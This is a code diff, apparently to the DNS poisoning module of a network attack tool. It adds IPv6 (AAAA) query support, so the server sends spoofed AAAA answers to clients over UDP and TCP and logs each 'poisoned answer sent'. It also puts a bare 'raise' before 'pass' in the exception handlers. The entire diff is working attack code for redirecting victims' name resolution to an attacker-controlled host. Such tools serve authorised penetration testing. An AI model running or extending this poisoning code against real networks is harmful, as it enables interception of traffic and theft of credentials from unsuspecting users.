@@ -15,7 +15,7 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 from utils import *
-from packets import DNS_Ans, DNS_SRV_Ans
+from packets import DNS_Ans, DNS_SRV_Ans, DNS6_Ans
 if settings.Config.PY2OR3 == "PY3":
 	from socketserver import BaseRequestHandler
 else:
@@ -28,6 +28,8 @@ def ParseDNSType(data):
 		return "A"
 	if QueryTypeClass == "\x00\x21\x00\x01":
 		return "SRV"
+	if QueryTypeClass == "\x00\x1c\x00\x01":
+		return "IPv6"
 
 
 
@@ -53,7 +55,15 @@ class DNS(BaseRequestHandler):
 				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
 				print(color("[*] [DNS] SRV Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))
 
+			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "IPv6":
+				buff = DNS6_Ans()
+				buff.calculate(NetworkRecvBufferPython2or3(data))
+				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
+				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
+				print(color("[*] [DNS] AAAA Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))
+
 		except Exception:
+			raise
 			pass
 
 # DNS Server TCP Class
@@ -79,5 +89,13 @@ class DNSTCP(BaseRequestHandler):
 				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
 				print(color("[*] [DNS] SRV Record poisoned answer sent: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))
 
+			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "IPv6":
+				buff = DNS6_Ans()
+				buff.calculate(NetworkRecvBufferPython2or3(data))
+				self.request.send(NetworkSendBufferPython2or3(buff))
+				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
+				print(color("[*] [DNS] AAAA Record poisoned answer sent: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))
+
 		except Exception:
+			raise
 			pass
